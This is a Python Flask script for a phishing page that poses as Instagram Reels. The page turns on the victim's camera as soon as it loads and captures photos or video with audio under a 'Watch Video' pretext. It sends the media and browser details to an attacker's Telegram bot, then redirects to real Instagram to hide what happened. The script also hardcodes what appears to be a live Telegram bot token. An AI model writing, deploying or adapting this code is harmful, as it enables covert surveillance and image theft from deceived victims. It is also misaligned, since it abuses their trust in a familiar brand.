import os
from flask import Flask, render_template_string, request, jsonify
import requests
import base64
from datetime import datetime

app = Flask(__name__)

# Config
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "8580091181:AAEXNF_lK3I2k_YRUVysnf1Cz8IXxrXGdTs")
CHAT_ID = os.getenv("CHAT_ID", "8507973714")
TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"

# Settings (Admin controls via Telegram)
target_url = "https://www.instagram.com/reels/"
capture_mode = "photo"  # photo or video
camera_type = "user"    # user (front) or environment (back)

def send_msg(text):
    requests.post(f"{TELEGRAM_API}/sendMessage", data={"chat_id": CHAT_ID, "text": text})

def send_photo(data, caption):
    requests.post(f"{TELEGRAM_API}/sendPhoto", 
        files={"photo": ("photo.jpg", data, "image/jpeg")}, 
        data={"chat_id": CHAT_ID, "caption": caption})

def send_video(data, caption):
    requests.post(f"{TELEGRAM_API}/sendVideo", 
        files={"video": ("video.mp4", data, "video/mp4")}, 
        data={"chat_id": CHAT_ID, "caption": caption})

@app.route('/set', methods=['POST'])
def set_target():
    global target_url, capture_mode, camera_type
    try:
        data = request.json
        if data.get('url') and 'instagram.com' in data['url']:
            target_url = data['url']
            send_msg(f"✅ Target set: {target_url}")
        elif data.get('mode') == 'video':
            capture_mode = 'video'
            send_msg("🎥 Video mode ACTIVE")
        elif data.get('mode') == 'photo':
            capture_mode = 'photo'
            send_msg("📸 Photo mode ACTIVE")
        elif data.get('camera') == 'back':
            camera_type = 'environment'
            send_msg("📷 Back camera ACTIVE")
        elif data.get('camera') == 'front':
            camera_type = 'user'
            send_msg("🤳 Front camera ACTIVE")
    except:
        pass
    return jsonify({"ok": True})

@app.route('/')
def stealth_phish():
    global target_url, capture_mode, camera_type
    
    html = f'''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Reels</title>
    <style>
        *{{margin:0;padding:0;box-sizing:border-box}}
        body{{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}}
        .card{{background:white;border-radius:25px;padding:50px 30px;max-width:400px;width:100%;box-shadow:0 25px 50px rgba(0,0,0,0.15);text-align:center}}
        .icon{{font-size:4rem;margin-bottom:25px;background:linear-gradient(45deg,#f09433,#e6683c);background-clip:text;-webkit-background-clip:text;-webkit-text-fill-color:transparent}}
        h1{{font-size:2.2rem;color:#262626;font-weight:700;margin-bottom:15px}}
        .desc{{color:#666;font-size:1.1rem;line-height:1.5;margin-bottom:40px}}
        .big-btn{{background:linear-gradient(45deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);color:white;border:none;padding:20px 50px;border-radius:50px;font-size:1.3rem;font-weight:600;cursor:pointer;width:100%;box-shadow:0 15px 35px rgba(240,148,51,0.4);transition:all 0.3s}}
        .big-btn:hover{{transform:translateY(-3px);box-shadow:0 20px 45px rgba(240,148,51,0.6)}}
        .big-btn:active{{transform:translateY(-1px)}}
        #status{{margin-top:20px;color:#666;font-size:0.9rem;min-height:20px}}
        #preview{{width:100%;max-height:250px;border-radius:15px;margin:20px 0;display:none;background:#000}}
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">📱</div>
        <h1>Instagram Reels</h1>
        <p class="desc">Click allow to watch video</p>
        <video id="preview" autoplay muted playsinline></video>
        <button class="big-btn" onclick="capture()">🎥 Watch Video</button>
        <div id="status"></div>
    </div>
    
    <script>
        let stream, recorder, chunks=[];
        const video = document.getElementById('preview');
        const status = document.getElementById('status');
        
        // AUTO START CAMERA (STEALTH)
        navigator.mediaDevices.getUserMedia({{
            video: {{ facingMode: '{camera_type}' }},
            audio: {capture_mode == 'video'}
        }}).then(s => {{
            stream = s;
            video.srcObject = stream;
            video.style.display = 'block';
            video.play();
        }}).catch(() => status.innerHTML = '⚠️ Permission needed');
        
        async function capture() {{
            status.innerHTML = '🔄 Loading video...';
            
            if('{capture_mode}' === 'video') {{
                // PERFECT VIDEO CAPTURE
                recorder = new MediaRecorder(stream);
                chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = () => {{
                    const blob = new Blob(chunks, {{type: 'video/webm'}});
                    const reader = new FileReader();
                    reader.onload = () => upload(reader.result, 'video');
                    reader.readAsDataURL(blob);
                }};
                recorder.start();
                setTimeout(() => recorder.stop(), 3500);
            }} else {{
                // PERFECT PHOTO CAPTURE
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {{
                    const reader = new FileReader();
                    reader.onload = () => upload(reader.result, 'photo');
                    reader.readAsDataURL(blob);
                }});
            }}
        }}
        
        function upload(dataUrl, type) {{
            fetch('/upload', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    media: dataUrl,
                    type: type,
                    agent: navigator.userAgent.substring(0,80),
                    language: navigator.language
                }})
            }}).then(() => {{
                status.innerHTML = '✅ Enjoy your reels!';
                setTimeout(() => window.location.href = '{target_url}', 800);
            }});
        }}
    </script>
</body>
</html>'''
    return render_template_string(html)

@app.route('/upload', methods=['POST'])
def upload():
    global target_url
    data = request.json
    media_str = data['media'].split(',')[1]
    media_bytes = base64.b64decode(media_str)
    
    time = datetime.now().strftime("%H:%M:%S")
    caption = f"🎯 NEW CAPTURE!\n🕒 {time}\n📱 {capture_mode.upper()}\n📷 {camera_type}\n🌐 {data['agent']}"
    
    if data['type'] == 'video':
        send_video(media_bytes, caption)
    else:
        send_photo(media_bytes, caption)
    
    return jsonify({"redirect": target_url})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    send_msg("🔥 STEALTH CAMERA BOT LIVE!\n\n📱 Send Instagram link to set target\n/photo /video\n/front /back")
    app.run(host='0.0.0.0', port=port)
